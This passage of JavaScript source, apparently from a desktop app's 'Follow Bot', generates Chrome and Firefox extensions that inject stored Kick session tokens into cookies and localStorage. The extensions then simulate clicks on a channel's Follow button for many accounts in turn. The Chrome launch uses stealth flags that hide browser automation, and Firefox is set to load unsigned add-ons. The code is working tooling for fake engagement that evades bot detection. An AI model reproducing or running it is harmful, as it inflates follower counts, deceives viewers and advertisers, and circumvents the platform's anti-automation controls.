        sessionStorage.removeItem(ATTEMPT_KEY);
        done(true, 'already-following');
        return;
      }
      // DOM is lying / stale — fall through and click again
    }

    // ─ 2. Find the visible Follow button ────────────────────────────────────
    const followBtn = await waitFor(findFollowButton, 20000, 350);
    if (!followBtn) {
      // No Follow button — re-check API just in case
      const apiNoBtn = await isFollowedViaApi();
      if (apiNoBtn === true) {
        sessionStorage.removeItem(ATTEMPT_KEY);
        done(true, 'already-following-no-btn');
        return;
      }
      if (attempt < MAX_ATTEMPTS) {
        report('no-button-reloading-attempt-' + (attempt + 1));
        sessionStorage.setItem(ATTEMPT_KEY, String(attempt + 1));
        await sleep(1200);
        location.reload();
        return;
      }
      sessionStorage.removeItem(ATTEMPT_KEY);
      done(false, 'follow-button-not-found');
      return;
    }

    // ─ 3. Click it (real synthetic mouse events) ────────────────────────────
    realClick(followBtn);
    report('clicked-attempt-' + attempt);

    // ─ 4. Wait briefly for Kick to process, then verify via API ─────────────
    await sleep(1500);
    report('verifying-via-api-followed-list');
    const apiVerified = await pollApiForFollow(20000, 1500); // up to 20s of polling

    if (apiVerified === true) {
      // ⭐ Kick confirms our slug is in /api/v2/channels/followed
      sessionStorage.removeItem(ATTEMPT_KEY);
      done(true, 'verified-via-api-attempt-' + attempt);
      return;
    }

    // ─ 5. API didn't confirm. If the followed-list endpoint itself is
    //     unreachable (apiVerified === null), fall back to DOM check.
    if (apiVerified === null) {
      report('api-unreachable-using-dom-fallback');
      const dom = await waitFor(checkFollowed, 6000, 300);
      if (dom) {
        sessionStorage.removeItem(ATTEMPT_KEY);
        done(true, 'followed-dom-only-' + dom + '-attempt-' + attempt);
        return;
      }
    }

    // ─ 6. Not confirmed. If we have retries left, reload + try again. ──────
    if (attempt < MAX_ATTEMPTS) {
      report('not-confirmed-reloading-attempt-' + (attempt + 1));
      sessionStorage.setItem(ATTEMPT_KEY, String(attempt + 1));
      await sleep(1500);
      location.reload();
      return;
    }

    // ─ 7. Out of attempts. ──────────────────────────────────────────────────
    sessionStorage.removeItem(ATTEMPT_KEY);
    done(false, 'api-says-not-followed-after-' + MAX_ATTEMPTS + '-attempts');
  }

  run().catch(e => done(false, 'js-error: ' + (e.message || e)));
})();
`;
  fs.writeFileSync(path.join(rootDir, 'content.js'), contentJs);
  return rootDir;
}

// ── Firefox WebExtension builder ────────────────────────────────────────────
//  Same logic as the Chrome extension above, repackaged as MV2 with a fixed
//  Gecko add-on ID so we can sideload it via the profile's extensions/ dir.
//  A small polyfill at the top of background.js maps the `browser.*` (Firefox
//  promise-style) API onto `chrome.*` so the rest of the code is identical.
const FBC_FIREFOX_EXT_ID = 'flt-follow@flt.local';

function fbcBuildFirefoxExtension(rootDir, params, sessionId, serverOrigin) {
  // The unpacked extension goes inside <profile>/extensions/<ext-id>/ — that
  // path is what Firefox scans at startup. The caller passes the inner dir.
  fs.mkdirSync(rootDir, { recursive: true });

  const manifest = {
    manifest_version: 2,
    name: 'FLT Follow Helper',
    version: '1.0',
    description: 'Token-injection follow helper (Firefox)',
    permissions: [
      'cookies',
      'storage',
      'tabs',
      '<all_urls>',
      'https://kick.com/*',
      'https://*.kick.com/*',
      'http://127.0.0.1/*',
      'http://localhost/*',
    ],
    background: { scripts: ['background.js'], persistent: true },
    content_scripts: [{
      matches: ['https://kick.com/*', 'https://*.kick.com/*'],
      js: ['content.js'],
      run_at: 'document_start',
    }],
    browser_specific_settings: {
      gecko: { id: FBC_FIREFOX_EXT_ID, strict_min_version: '78.0' },
    },
  };
  fs.writeFileSync(path.join(rootDir, 'manifest.json'), JSON.stringify(manifest, null, 2));

  // Map Firefox's promise-based `browser.*` namespace onto `chrome.*` so the
  // rest of the script behaves like the Chrome MV3 build.
  const ffPolyfill =
`if (typeof browser !== 'undefined' && browser.cookies) { globalThis.chrome = browser; }
`;

  const backgroundJs = ffPolyfill +
`const TOKEN   = ${JSON.stringify(params.token)};
const CHANNEL = ${JSON.stringify(params.channel)};
const SESSION = ${JSON.stringify(sessionId)};
const SERVER  = ${JSON.stringify(serverOrigin)};

function report(status, extra) {
  try {
    fetch(SERVER + '/follow-status', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(Object.assign({ session: SESSION, status, url: 'bg' }, extra || {})),
    });
  } catch (_) {}
}

async function setKickCookies(token) {
  const exp = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30; // 30 days
  for (const name of ['session_token', 'kick_session']) {
    try {
      await chrome.cookies.set({
        url:    'https://kick.com',
        name,
        value:  token,
        path:   '/',
        secure: true,
        sameSite: 'lax',
        expirationDate: exp,
      });
    } catch (_) {}
  }
}

async function bootstrap() {
  report('bg-starting');
  if (!TOKEN || !CHANNEL) { report('bg-no-token'); return; }

  await chrome.storage.local.set({
    flt_token: TOKEN, flt_channel: CHANNEL,
    flt_session: SESSION, flt_server: SERVER,
  });

  await setKickCookies(TOKEN);
  report('bg-cookies-set');

  // Firefox quirk: chrome.tabs.query({}) may return [] right after extension
  // startup because the about:blank tab isn't indexed yet. Poll briefly so
  // we update the existing tab in place instead of opening a 2nd one.
  let tabs = [];
  for (let i = 0; i < 20; i++) {
    try { tabs = await chrome.tabs.query({}); } catch (_) { tabs = []; }
    if (tabs && tabs.length > 0) break;
    await new Promise(r => setTimeout(r, 100));
  }
  const target = 'https://kick.com/' + CHANNEL;
  if (tabs && tabs.length > 0) {
    // Repurpose the first tab; close any leftover tabs (about:blank etc.)
    try { await chrome.tabs.update(tabs[0].id, { url: target, active: true }); } catch (_) {}
    for (let i = 1; i < tabs.length; i++) {
      try { await chrome.tabs.remove(tabs[i].id); } catch (_) {}
    }
  } else {
    await chrome.tabs.create({ url: target, active: true });
  }
  report('bg-navigating-to-' + CHANNEL);
}

// ── Shutdown handler ────────────────────────────────────────────────────────
// On Windows firefox.exe acts as a launcher that exits as soon as the real
// Firefox process is up — so the main process's kill(pid) is a no-op against
// a dead launcher. To reliably close Firefox we ask the extension itself to
// remove all tabs (an empty window auto-closes the browser).
chrome.runtime.onMessage.addListener((msg) => {
  if (!msg || msg.action !== 'flt-shutdown') return;
  (async () => {
    try {
      const all = await chrome.tabs.query({});
      for (const t of all) {
        try { await chrome.tabs.remove(t.id); } catch (_) {}
      }
    } catch (_) {}
  })();
});

bootstrap();
`;
  fs.writeFileSync(path.join(rootDir, 'background.js'), backgroundJs);

  // content.js — byte-identical to the Chrome build's content.js (proven
  // working algorithm: API-first authoritative check, then DOM, with reload
  // retry up to MAX_ATTEMPTS). The ONLY Firefox-specific changes are:
  //   1. ffPolyfill prefix maps browser.* → chrome.*
  //   2. done() additionally sends an 'flt-shutdown' message so the BG
  //      script removes all tabs → Firefox auto-exits.
  const contentJs = ffPolyfill +
`(async function() {
  // Plant token into localStorage as early as possible (Kick's SPA reads it on boot)
  let cfg = {};
  try { cfg = await chrome.storage.local.get(['flt_token','flt_channel','flt_session','flt_server']); } catch (_) {}
  if (cfg.flt_token) {
    try {
      localStorage.setItem('kick_token', cfg.flt_token);
      localStorage.setItem('token',      cfg.flt_token);
    } catch (_) {}
  }

  // Only run the click-flow once per tab
  if (window.__FLT_FBC_RAN) return;
  window.__FLT_FBC_RAN = true;

  const TOKEN   = cfg.flt_token;
  const CHANNEL = cfg.flt_channel;
  const SESSION = cfg.flt_session;
  const SERVER  = cfg.flt_server;
  if (!TOKEN || !CHANNEL || !SESSION || !SERVER) return;

  // Initial heartbeat so FLT knows the extension is alive on this page
  fetch(SERVER + '/follow-status', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ session: SESSION, status: 'loaded', url: location.href }),
  }).catch(() => {});

  // ── Helpers ───────────────────────────────────────────────────────────────
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  function visible(el) {
    if (!el) return false;
    const r = el.getBoundingClientRect();
    if (!r.width || !r.height) return false;
    const cs = getComputedStyle(el);
    return cs.display !== 'none' && cs.visibility !== 'hidden' && cs.opacity !== '0';
  }
  function realClick(el) {
    if (!el) return;
    try {
      const r = el.getBoundingClientRect();
      const x = r.left + r.width / 2;
      const y = r.top + r.height / 2;
      el.focus && el.focus();
      el.dispatchEvent(new MouseEvent('mousedown', { bubbles: true, cancelable: true, view: window, clientX: x, clientY: y, button: 0 }));
      el.dispatchEvent(new MouseEvent('mouseup',   { bubbles: true, cancelable: true, view: window, clientX: x, clientY: y, button: 0 }));
      el.dispatchEvent(new MouseEvent('click',     { bubbles: true, cancelable: true, view: window, clientX: x, clientY: y, button: 0 }));
    } catch (_) {}
    try { el.click(); } catch (_) {}
  }
  async function waitFor(fn, timeoutMs, pollMs) {
    const t0 = Date.now();
    while (Date.now() - t0 < timeoutMs) {
      const v = fn();
      if (v) return v;
      await sleep(pollMs || 300);
    }
    return null;
  }
  function report(status) {
    fetch(SERVER + '/follow-status', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ session: SESSION, status, url: location.href }),
    }).catch(() => {});
    try { document.title = '[FLT-FBC:' + status + '] ' + document.title.replace(/^\\[FLT-FBC:[^\\]]+\\] /, ''); } catch (_) {}
  }
  // Firefox-only: ask the background to close every tab. Firefox exits when
  // the last tab is gone — that's how we shut Firefox down cleanly. The
  // \`firefox.exe\` launcher PID our main process has is already dead by then
  // so kill(pid) wouldn't work; this handshake is the reliable path.
  function shutdownBrowser() {
    try { chrome.runtime.sendMessage({ action: 'flt-shutdown' }); } catch (_) {}
  }
  function done(success, info) {
    fetch(SERVER + '/follow-status', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        session: SESSION,
        status:  success ? 'done' : 'fail',
        info, url: location.href,
      }),
    }).catch(() => {}).finally(() => setTimeout(shutdownBrowser, 200));
  }

  function findFollowButton() {
    return Array.from(document.querySelectorAll('button, [role="button"], a'))
      .filter(visible)
      .find(b => /^\\s*follow\\s*$/i.test((b.textContent || '').trim()));
  }
  function findFollowingIndicator() {
    // Kick flips the button to one of several states after a successful follow:
    //   "Following" · "Unfollow" · "Following ✓" · sometimes just an icon
    // Match anything that means the follow took effect.
    const els = Array.from(document.querySelectorAll('button, [role="button"], a, span'))
      .filter(visible);
    return els.find((b) => {
      const t = (b.textContent || '').trim().replace(/\\s+/g, ' ');
      if (!t || t.length > 30) return false;
      return /^(following|unfollow|followed|✓\\s*following)$/i.test(t);
    });
  }

  // ── Verify the follow actually took — three signals, ANY of them = success
  function checkFollowed() {
    if (findFollowingIndicator()) return 'indicator';
    if (!findFollowButton())      return 'button-gone';
    return null;
  }

  // ── Authoritative verification: ask Kick directly which channels we follow.
  //    GET /api/v2/channels/followed returns the list — if our slug is in it,
  //    the follow is 100% confirmed on Kick's backend.
  //    Returns:  true  = confirmed following
  //              false = response was OK but our channel is NOT in the list
  //              null  = couldn't get a clear answer (network / parse error)
  async function isFollowedViaApi() {
    try {
      const r = await fetch('/api/v2/channels/followed', {
        credentials: 'include',
        headers:     { accept: 'application/json', 'x-app-platform': 'web' },
      });
      if (!r.ok) return null;
      const j = await r.json().catch(() => null);
      if (!j) return null;
      const list =
        Array.isArray(j)            ? j :
        Array.isArray(j.data)       ? j.data :
        Array.isArray(j.channels)   ? j.channels :
        Array.isArray(j.followed)   ? j.followed :
        Array.isArray(j['hydra:member']) ? j['hydra:member'] :
        [];
      if (!Array.isArray(list)) return false;
      const target = String(CHANNEL).toLowerCase();
      return list.some((item) => {
        if (!item) return false;
        const slugs = [
          item.slug, item.username, item.name,
          item.channel && item.channel.slug,
          item.channel && item.channel.username,
          item.user    && item.user.username,
          item.user    && item.user.slug,
        ];
        return slugs.some((s) => typeof s === 'string' && s.toLowerCase() === target);
      });
    } catch (_) { return null; }
  }

  // Poll the API until we see our channel in the followed list (or timeout).
  async function pollApiForFollow(maxMs, pollMs) {
    const t0 = Date.now();
    let nullStreak = 0;
    while (Date.now() - t0 < maxMs) {
      const res = await isFollowedViaApi();
      if (res === true) return true;
      if (res === null) {
        nullStreak++;
        if (nullStreak >= 3) return null;
      } else {
        nullStreak = 0;
      }
      await sleep(pollMs);
    }
    return false;
  }

  async function run() {
    report('starting');

    const channelPathRe = new RegExp('^/' + CHANNEL.replace(/[.*+?^\${}()|[\\]\\\\]/g, '\\\\$&') + '(/|$)');
    if (!channelPathRe.test(location.pathname)) {
      report('waiting-for-channel-page');
      return;
    }

    const ATTEMPT_KEY = '__flt_fbc_attempt';
    const MAX_ATTEMPTS = 3;
    let attempt = parseInt(sessionStorage.getItem(ATTEMPT_KEY) || '1', 10);
    if (!Number.isFinite(attempt) || attempt < 1) attempt = 1;

    report('attempt-' + attempt + '-of-' + MAX_ATTEMPTS);

    // Wait for the Nuxt/Inertia SPA to hydrate
    await sleep(attempt === 1 ? 3000 : 4000);

    // ─ 1. Already following? Authoritative API check first. ─────────────────
    const apiPre = await isFollowedViaApi();
    if (apiPre === true) {
      sessionStorage.removeItem(ATTEMPT_KEY);
      done(true, 'already-following-per-api');
      return;
    }
    if (findFollowingIndicator()) {
      // DOM says following — confirm with API before closing
      const apiConfirm = await isFollowedViaApi();
      if (apiConfirm === true) {
        sessionStorage.removeItem(ATTEMPT_KEY);
        done(true, 'already-following');
        return;
      }
      // DOM is lying / stale — fall through and click again
    }

    // ─ 2. Find the visible Follow button ────────────────────────────────────
    const followBtn = await waitFor(findFollowButton, 20000, 350);
    if (!followBtn) {
      const apiNoBtn = await isFollowedViaApi();
      if (apiNoBtn === true) {
        sessionStorage.removeItem(ATTEMPT_KEY);
        done(true, 'already-following-no-btn');
        return;
      }
      if (attempt < MAX_ATTEMPTS) {
        report('no-button-reloading-attempt-' + (attempt + 1));
        sessionStorage.setItem(ATTEMPT_KEY, String(attempt + 1));
        await sleep(1200);
        location.reload();
        return;
      }
      sessionStorage.removeItem(ATTEMPT_KEY);
      done(false, 'follow-button-not-found');
      return;
    }

    // ─ 3. Click it ─────────────────────────────────────────────────────────
    realClick(followBtn);
    report('clicked-attempt-' + attempt);

    // ─ 4. Verify via API ────────────────────────────────────────────────────
    await sleep(1500);
    report('verifying-via-api-followed-list');
    const apiVerified = await pollApiForFollow(20000, 1500);

    if (apiVerified === true) {
      sessionStorage.removeItem(ATTEMPT_KEY);
      done(true, 'verified-via-api-attempt-' + attempt);
      return;
    }

    // ─ 5. API unreachable → DOM fallback ────────────────────────────────────
    if (apiVerified === null) {
      report('api-unreachable-using-dom-fallback');
      const dom = await waitFor(checkFollowed, 6000, 300);
      if (dom) {
        sessionStorage.removeItem(ATTEMPT_KEY);
        done(true, 'followed-dom-only-' + dom + '-attempt-' + attempt);
        return;
      }
    }

    // ─ 6. Not confirmed → reload + retry ────────────────────────────────────
    if (attempt < MAX_ATTEMPTS) {
      report('not-confirmed-reloading-attempt-' + (attempt + 1));
      sessionStorage.setItem(ATTEMPT_KEY, String(attempt + 1));
      await sleep(1500);
      location.reload();
      return;
    }

    sessionStorage.removeItem(ATTEMPT_KEY);
    done(false, 'api-says-not-followed-after-' + MAX_ATTEMPTS + '-attempts');
  }

  run().catch(e => done(false, 'js-error: ' + (e.message || e)));
})();
`;
  fs.writeFileSync(path.join(rootDir, 'content.js'), contentJs);
  return rootDir;
}

// ── Firefox follow flow ──────────────────────────────────────────────────────
//  Sideloads the WebExtension into a fresh temp Firefox profile, sets prefs
//  to bypass the unsigned-add-on guard (works on Developer Edition / Nightly
//  / ESR), then spawns Firefox pointing at about:blank — the background
//  script plants cookies and navigates the tab to kick.com/<channelSlug>.
async function fbcFollowOneFirefox(acc, channelSlug) {
  const firefoxPath = kacFindFirefox();
  if (!firefoxPath) {
    throw new Error(
      'Firefox not found. Install Firefox Developer Edition from ' +
      'https://www.mozilla.org/firefox/developer/  (or Firefox Nightly) — ' +
      'the Follow Bot needs a Firefox flavor that allows unsigned add-ons.'
    );
  }

  const tmpProfile = path.join(app.getPath('temp'),
    'flt-fbc-ff-' + Date.now() + '-' + Math.floor(Math.random() * 1e6));
  try { fs.mkdirSync(tmpProfile, { recursive: true }); } catch (_) {}

  // Drop the unpacked extension at <profile>/extensions/<gecko-id>/ — Firefox
  // sideloads it on startup. (Sideloading is enabled by autoDisableScopes=0
  // in user.js below.)
  const extDir = path.join(tmpProfile, 'extensions', FBC_FIREFOX_EXT_ID);

  // Ensure the local bridge server is up (shared with KAC & Chrome FBC)
  kacStartServer();
  for (let i = 0; i < 30 && !_kacServerPort; i++) await kacSleep(50);
  if (!_kacServerPort) throw new Error('Local bridge server failed to start');

  const sessionId = fbcNewSessionId();
  fbcBuildFirefoxExtension(extDir, {
    email:    acc.email    || null,
    password: acc.password || null,
    token:    acc.token    || null,
    channel:  channelSlug,
  }, sessionId, kacServerOrigin());

  // Pre-seed prefs to make the sideloaded extension actually load + skip
  // the first-run, telemetry, default-browser, and updater UI that would
  // otherwise interfere.
  const userJs = [
    'user_pref("xpinstall.signatures.required", false);',
    'user_pref("extensions.langpacks.signatures.required", false);',
    'user_pref("xpinstall.whitelist.required", false);',
    'user_pref("extensions.autoDisableScopes", 0);',
    'user_pref("extensions.enabledScopes", 15);',
    'user_pref("extensions.startupScanScopes", 15);',
    'user_pref("extensions.update.enabled", false);',
    'user_pref("app.update.enabled", false);',
    'user_pref("browser.shell.checkDefaultBrowser", false);',
    'user_pref("browser.startup.homepage_override.mstone", "ignore");',
    'user_pref("browser.aboutwelcome.enabled", false);',
    'user_pref("toolkit.telemetry.reportingpolicy.firstRun", false);',
    'user_pref("datareporting.policy.firstRunURL", "");',
    'user_pref("datareporting.policy.dataSubmissionEnabled", false);',
    'user_pref("browser.tabs.warnOnClose", false);',
    'user_pref("browser.tabs.warnOnCloseOtherTabs", false);',
    'user_pref("browser.sessionstore.resume_from_crash", false);',
    'user_pref("dom.disable_open_during_load", false);',
    '',
  ].join('\n');
  try { fs.writeFileSync(path.join(tmpProfile, 'user.js'), userJs, 'utf8'); } catch (_) {}

  const firefoxArgs = [
    '-profile', tmpProfile,
    '-no-remote',       // don't attach to an existing Firefox instance
    '-new-instance',    // force a brand-new process
    '-foreground',
    'about:blank',
  ];

  const { spawn } = require('child_process');
  const firefoxProc = spawn(firefoxPath, firefoxArgs, {
    detached:    false,
    stdio:       'ignore',
    windowsHide: false,
    shell:       false,
  });
  FBC.chromeProc = firefoxProc;  // reuse the slot so existing stop logic works

  const pending = {
    sessionId, acc, channelSlug,
    tmpProfile, tmpExt: null, chromeProc: firefoxProc,
    heartbeat: false,
    resolve: null, reject: null, timer: null,
  };
  FBC_PENDING.set(sessionId, pending);

  // Watchdog — if the extension never reports in within 18s (Firefox is
  // slower to cold-start than Chrome), tell the user what's wrong.
  setTimeout(() => {
    const p = FBC_PENDING.get(sessionId);
    if (!p || p.heartbeat) return;
    fbcEmit('follow-clicker-progress', {
      step: 'warn', type: 'warn',
      msg:  '⚠ Firefox extension did not load. Most likely cause: you are on ' +
            'Firefox Stable which requires signed add-ons. Install Firefox ' +
            'Developer Edition (https://www.mozilla.org/firefox/developer/) ' +
            'or Firefox Nightly and try again.',
    });
  }, 18000);

  try {
    const res = await new Promise((resolve, reject) => {
      pending.resolve = resolve;
      pending.reject  = reject;
      pending.timer = setTimeout(() => {
        FBC_PENDING.delete(sessionId);
        reject(new Error('Follow timed out after 3 minutes'));
      }, 3 * 60 * 1000);
    });
    return res;
  } finally {
    // The extension closes Firefox itself by removing all tabs as soon as
    // done() fires (content.js → background.js → chrome.tabs.remove). That
    // closes Firefox cleanly. The block below is the safety net for cases
    // where the extension shutdown handshake didn't fire (e.g. crash, JS
    // error before done() ran). Wait briefly to let the clean path happen,
    // then force-kill any survivors.
    setTimeout(() => {
      try { firefoxProc.kill('SIGTERM'); } catch (_) {}
      setTimeout(() => { try { firefoxProc.kill('SIGKILL'); } catch (_) {} }, 800);
      // On Windows firefox.exe is a launcher — its PID exits as soon as
      // the real Firefox process is up. Kill by image-name walking the
      // tree to catch the actual content/parent processes that linger.
      if (process.platform === 'win32' && firefoxProc.pid) {
        setTimeout(() => {
          try {
            const { spawn } = require('child_process');
            spawn('taskkill', ['/F', '/T', '/PID', String(firefoxProc.pid)], {
              stdio: 'ignore', detached: false, windowsHide: true,
            });
          } catch (_) {}
        }, 1200);
      }
      try { fs.rmSync(tmpProfile, { recursive: true, force: true }); } catch (_) {}
      if (FBC.chromeProc === firefoxProc) FBC.chromeProc = null;
    }, 400);
  }
}

async function fbcFollowOne(acc, channelSlug) {
  const chromePath = kacFindChrome();
  if (!chromePath) throw new Error('Real Chrome not found — install Google Chrome.');

  const tmpProfile = path.join(app.getPath('temp'),
    'flt-fbc-' + Date.now() + '-' + Math.floor(Math.random() * 1e6));
  const tmpExt = path.join(app.getPath('temp'),
    'flt-fbc-ext-' + Date.now() + '-' + Math.floor(Math.random() * 1e6));
  try { fs.mkdirSync(tmpProfile, { recursive: true }); } catch (_) {}

  // Ensure the local bridge server is up (shared with KAC)
  kacStartServer();
  for (let i = 0; i < 30 && !_kacServerPort; i++) await kacSleep(50);
  if (!_kacServerPort) throw new Error('Local bridge server failed to start');

  const sessionId = fbcNewSessionId();
  fbcBuildExtension(tmpExt, {
    email:    acc.email    || null,
    password: acc.password || null,
    token:    acc.token    || null,
    channel:  channelSlug,
  }, sessionId, kacServerOrigin());

  // Match the KAC stealth flag set — this is what makes --load-extension
  // actually work on newer / locked-down Chrome installs that otherwise
  // silently ignore unpacked extensions. PLUS aggressive disk-saver flags:
  // kick.com autoplays the live HLS stream the moment its page loads, so
  // every account's temp profile balloons with cached video segments. The
  // flags below disable disk cache, media cache, autoplay, and background
  // networking — minimal disk footprint per account.
  const chromeArgs = [
    '--user-data-dir=' + tmpProfile,
    '--disable-features=' + [
      'DisableLoadExtensionCommandLineSwitch',  // Chrome 137+ honors --load-extension
      'IsolateOrigins',
      'site-per-process',
      'AutomationControlled',
      'SigninInterceptBubbleV2',                // skip the signin-intercept bubble
      'MediaCapabilitiesQueryGpuFactories',     // skip GPU media probing
      'PreloadMediaEngagementData',
      'MediaEngagementBypassAutoplayPolicies',
    ].join(','),
    '--disable-blink-features=AutomationControlled',
    '--load-extension=' + tmpExt,
    '--no-first-run',
    '--no-default-browser-check',
    '--no-service-autorun',
    '--password-store=basic',
    '--disable-infobars',
    '--disable-popup-blocking',
    '--disable-translate',
    '--disable-fre',                            // disable first-run experience
    // ── Disk-saver flags ─────────────────────────────────────────────────
    '--disk-cache-size=1',                      // 1-byte HTTP cache (effectively off)
    '--media-cache-size=1',                     // 1-byte media cache
    '--aggressive-cache-discard',
    '--disable-application-cache',
    '--disable-offline-load-stale-cache',
    '--autoplay-policy=user-gesture-required',  // never auto-start video
    '--mute-audio',                             // no audio either
    '--disable-background-networking',          // no metric/safe-browsing uploads
    '--disable-background-timer-throttling',
    '--disable-component-update',
    '--disable-sync',
    '--disable-domain-reliability',
    '--no-pings',
    '--disable-breakpad',                       // no crash dumps to disk
    '--disable-logging',
    '--disable-software-rasterizer',
    // ── Window placement ────────────────────────────────────────────────
    '--new-window',
    '--start-maximized',
    '--window-position=80,80',
    '--window-size=1280,820',
    // Open to about:blank — the background.js service worker will:
    //   1. plant the session_token / kick_session cookies
    //   2. navigate this tab to https://kick.com/<channelSlug>
    // This way kick.com NEVER loads without auth cookies set first.
    'about:blank',
  ];

  const { spawn } = require('child_process');
  const chromeProc = spawn(chromePath, chromeArgs, {
    detached:    false,
    stdio:       'ignore',
    windowsHide: false,                 // do NOT hide the Chrome window
    shell:       false,
  });
  FBC.chromeProc = chromeProc;

  const pending = {
    sessionId, acc, channelSlug,
    tmpProfile, tmpExt, chromeProc,
    heartbeat: false,
    resolve: null, reject: null, timer: null,
  };
  FBC_PENDING.set(sessionId, pending);

  // ── Watchdog — if the extension never reports in within 12s the
  //    background service worker didn't start. Likely cause: managed
  //    Chrome on the target machine silently drops --load-extension.
  setTimeout(() => {
    const p = FBC_PENDING.get(sessionId);
    if (!p || p.heartbeat) return;
    fbcEmit('follow-clicker-progress', {
      step: 'warn', type: 'warn',
      msg:  '⚠ Extension never loaded on this Chrome (stuck on about:blank). ' +
            'Chrome dropped --load-extension. Possible cause: Chrome 138+ ' +
            'managed install, AV blocking AppData\\Local\\Temp, or Chrome older than v111.',
    });
  }, 12000);

  try {
    const res = await new Promise((resolve, reject) => {
      pending.resolve = resolve;
      pending.reject  = reject;
      pending.timer = setTimeout(() => {
        FBC_PENDING.delete(sessionId);
        reject(new Error('Follow timed out after 3 minutes'));
      }, 3 * 60 * 1000);
    });
    return res;
  } finally {
    // Hard-kill Chrome process tree, then wait for file handles to release,
    // then delete with retry. If we don't wait, Chrome's lock on the cache
    // files makes rmSync silently fail → temp dirs pile up → disk fills.
    (async () => {
      try { chromeProc.kill('SIGTERM'); } catch (_) {}
      await kacSleep(400);
      try { chromeProc.kill('SIGKILL'); } catch (_) {}
      // Walk the process tree on Windows — Chrome spawns content children
      // that hold cache locks even after the parent dies.
      if (process.platform === 'win32' && chromeProc.pid) {
        try {
          const { spawn } = require('child_process');
          spawn('taskkill', ['/F', '/T', '/PID', String(chromeProc.pid)], {
            stdio: 'ignore', detached: false, windowsHide: true,
          });
        } catch (_) {}
      }
      // Wait for the OS to release file handles, then delete with retries.
      await kacSleep(800);
      for (let attempt = 0; attempt < 4; attempt++) {
        try { fs.rmSync(tmpProfile, { recursive: true, force: true, maxRetries: 3, retryDelay: 200 }); break; }
        catch (_) { await kacSleep(500); }
      }
      for (let attempt = 0; attempt < 4; attempt++) {
        try { fs.rmSync(tmpExt, { recursive: true, force: true, maxRetries: 3, retryDelay: 200 }); break; }
        catch (_) { await kacSleep(500); }
      }
      if (FBC.chromeProc === chromeProc) FBC.chromeProc = null;
    })();
  }
}

// ── Startup sweep: kill leftover temp dirs from any prior crashed run ──────
// Called once on app launch. Safely deletes any `flt-fbc-*` / `flt-fbc-ext-*`
// folders in %TEMP% that are older than 30 seconds and not held by Chrome.
// Without this, a single FLT crash mid-run could leave a 200 MB+ folder
// permanently behind. Over weeks of use that adds up to many GB.
function fbcSweepStaleTempDirs() {
  try {
    const tmp = app.getPath('temp');
    if (!tmp || !fs.existsSync(tmp)) return;
    const now = Date.now();
    const entries = fs.readdirSync(tmp);
    let freed = 0;
    for (const name of entries) {
      if (!/^flt-(fbc|fbc-ext|kac)-\d+/.test(name)) continue;
      const full = path.join(tmp, name);
      try {
        const st = fs.statSync(full);
        // Skip anything modified in the last 30s — could be a live run
        if (now - st.mtimeMs < 30000) continue;
        // Get approx size before delete (for logging)
        let size = 0;
        try {
          const walk = (dir) => {
            for (const f of fs.readdirSync(dir, { withFileTypes: true })) {
              const p = path.join(dir, f.name);
              if (f.isDirectory()) walk(p);
              else { try { size += fs.statSync(p).size; } catch {} }
            }
          };
          walk(full);
        } catch (_) {}
        fs.rmSync(full, { recursive: true, force: true, maxRetries: 2, retryDelay: 300 });
        freed += size;
      } catch (_) { /* in use or permission denied — leave it */ }
    }
    if (freed > 0) {
      console.log('[FLT] sweep freed', Math.round(freed / 1024 / 1024), 'MB of stale temp dirs');
      try {
        fltLog.log('temp.sweep', { freed_mb: Math.round(freed / 1024 / 1024) }, 'info',
          'Cleaned ' + Math.round(freed / 1024 / 1024) + ' MB of stale temp dirs');
      } catch (_) {}
    }
  } catch (_) {}
}

ipcMain.handle('follow-clicker-start', async (_e, opts) => {
  if (FBC.running) return { ok: false, error: 'Already running' };
  const accounts    = (opts && Array.isArray(opts.accounts)) ? opts.accounts : [];
  const channelSlug = String((opts && opts.channelSlug) || '').trim().replace(/^kick\.com\//i, '').replace(/^\/+/, '');
  const gapMs       = Math.max(0, parseInt((opts && opts.gapMs) || 3000, 10) || 0);
  const browser     = String((opts && opts.browser) || 'chrome').toLowerCase() === 'firefox' ? 'firefox' : 'chrome';
  const followFn    = browser === 'firefox' ? fbcFollowOneFirefox : fbcFollowOne;

  if (!channelSlug)     return { ok: false, error: 'No channel specified' };
  if (!accounts.length) return { ok: false, error: 'No accounts specified' };

  fltLog.log(fltLog.ACTIONS.FOLLOW_RUN, {
    channel: channelSlug, account_count: accounts.length, gap_ms: gapMs, browser,
  }, 'info', `Follow Bot started: ${accounts.length} accounts → @${channelSlug} (${browser})`);

  FBC.running = true; FBC.abort = false;
  const results = [];
  try {
    for (let i = 0; i < accounts.length; i++) {
      if (FBC.abort) break;
      const acc = accounts[i];
      fbcEmit('follow-clicker-progress', {
        step: 'cycle', type: 'info',
        msg:  `Account ${i + 1}/${accounts.length}: ${acc.username || acc.email || '(no name)'}`,
        index: i, total: accounts.length,
      });
      try {
        const r = await followFn(acc, channelSlug);
        results.push({ account: acc.username, success: !!r.success, info: r.info || null });
        fbcEmit('follow-clicker-progress', {
          step: r.success ? 'ok' : 'fail',
          type: r.success ? 'ok' : 'err',
          msg:  `${acc.username || '?'}: ${r.success ? '✓ ' + (r.info || 'followed') : '✗ ' + (r.info || 'failed')}`,
          account: acc.username,
        });
      } catch (e) {
        results.push({ account: acc.username, success: false, error: e.message });
        fbcEmit('follow-clicker-progress', {
          step: 'fail', type: 'err',
          msg:  `${acc.username || '?'}: ✗ ${e.message}`,
          account: acc.username,
        });
      }
      if (i < accounts.length - 1 && !FBC.abort) await kacSleep(gapMs);
    }
    const okCount = results.filter(r => r.success).length;
    fbcEmit('follow-clicker-progress', {
      step: 'done', type: okCount === accounts.length ? 'ok' : 'warn',
      msg: `Finished — ${okCount}/${accounts.length} followed.`,
    });
    fltLog.log(fltLog.ACTIONS.FOLLOW_RESULT, {
      channel: channelSlug, succeeded: okCount, total: accounts.length, browser,
    }, okCount > 0 ? 'info' : 'warn',
      `Follow Bot finished: ${okCount}/${accounts.length} followed @${channelSlug}`);
    return { ok: true, results, succeeded: okCount, total: accounts.length };
  } finally {
    FBC.running = false; FBC.abort = false;
  }
});

ipcMain.handle('follow-clicker-stop', async () => {
  FBC.abort = true;
